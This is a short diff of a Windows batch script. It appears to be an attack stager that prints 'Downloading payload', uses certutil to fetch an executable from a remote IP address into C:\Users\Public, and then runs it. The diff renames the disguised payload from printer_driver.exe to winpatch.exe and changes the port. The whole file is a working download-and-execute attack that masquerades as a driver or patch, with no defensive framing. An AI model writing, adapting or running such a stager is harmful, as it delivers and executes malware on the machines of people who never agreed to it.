@@ -1,9 +1,9 @@
 @echo off
 echo [*] Downloading payload...
-certutil -urlcache -split -f http://192.168.10.87:8899/printer_driver.exe C:\Users\Public\printer_driver.exe
+certutil -urlcache -split -f http://192.168.10.87:9988/winpatch.exe C:\Users\Public\winpatch.exe
 
 echo [*] Executing payload...
-start C:\Users\Public\printer_driver.exe
+start C:\Users\Public\winpatch.exe
 
 echo [*] Done. Window will close automatically.
 timeout /t 3 >nul
